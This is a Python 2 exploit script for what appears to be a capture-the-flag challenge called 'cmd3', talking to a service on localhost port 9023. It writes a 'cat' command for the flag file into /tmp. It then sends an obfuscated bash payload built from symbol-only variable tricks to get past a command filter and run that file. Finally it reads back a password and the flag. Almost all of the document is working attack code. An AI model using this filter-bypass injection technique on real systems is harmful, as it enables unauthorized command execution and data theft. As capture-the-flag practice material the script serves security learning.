import socket
import struct
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("localhost", 9023))
 
f = s.makefile()
 
line = f.readline()
while "your password" not in line:
    line = f.readline()
 
flagfile = line.split("flagbox/")[1].strip()
print "Flag File: %s" % flagfile
 
cmdfile = open("/tmp/___", "w+")
cmdfile.write("cat /home/cmd3_pwn/flagbox/"+flagfile)
cmdfile.close()
 
#where the magic happens
#this string uses some bullshit tricks to fill variables with spaces and "cat" and whatnot
sploitstr = '__=$((($$/$$)));___=({.,.});____=${___[@]};_____=${____:__:__};___=$(((__+__)));' \
      + '____=$(((___+__)));______=$(((____+___)));????/???;$(${_:______:____}${_____}/???/___)' + "\n"
 
s.send(sploitstr)
f.readline()
 
password = f.read(32)
print "Password: %s" % password
s.send(password+"\n")
 
#read the output and get dat flag son
print "Flag: %s" % f.readline().split("cmd3$ Congratz! here is flag : ")[1].strip()